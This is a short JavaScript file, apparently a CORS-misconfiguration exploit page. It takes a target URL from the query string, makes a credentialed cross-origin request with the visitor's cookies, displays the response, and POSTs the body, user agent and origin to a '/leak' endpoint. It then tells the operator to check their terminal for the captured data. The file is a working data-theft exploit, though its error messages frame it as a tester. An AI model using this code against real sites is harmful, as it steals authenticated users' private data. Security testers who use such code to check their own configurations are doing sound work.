function log(msg, type = 'info') {
    const logEl = document.getElementById('log');
    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    const typeClass = 'log-' + type;

    const line = document.createElement('div');
    line.className = 'log-line';
    line.innerHTML = '<span class="log-time">' + time + '</span> <span class="' + typeClass + '">' + msg + '</span>';
    logEl.appendChild(line);
    logEl.scrollTop = logEl.scrollHeight;
    console.log('[' + type + ']', msg);
}

(function () {
    const params = new URLSearchParams(window.location.search);
    const target = params.get("target");

    if (!target) {
        log("Waiting for target URL...", 'info');
        log("Add ?target=https://example.com/api/endpoint to the URL", 'info');
        return;
    }

    log("Target: " + target, 'info');
    log("Sending credentialed request...", 'info');

    fetch(target, {
        method: 'GET',
        credentials: 'include',
        mode: 'cors'
    })
        .then(resp => {
            log("Got " + resp.status + " " + resp.statusText, resp.ok ? 'success' : 'warn');
            return resp.text();
        })
        .then(body => {
            log("Received " + body.length + " bytes", 'success');

            document.getElementById('result').style.display = 'block';
            document.getElementById('data').textContent = body;

            return fetch("/leak", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    target: target,
                    timestamp: new Date().toISOString(),
                    data: body,
                    metadata: {
                        'user-agent': navigator.userAgent,
                        'origin': window.location.origin
                    }
                })
            });
        })
        .then(() => {
            log("Data captured - check your terminal", 'success');
        })
        .catch(err => {
            log(err.message, 'error');
            log("", 'info');
            log("This usually means CORS is configured correctly (good!).", 'info');
            log("Or you're not authenticated to the target.", 'info');
        });
})();
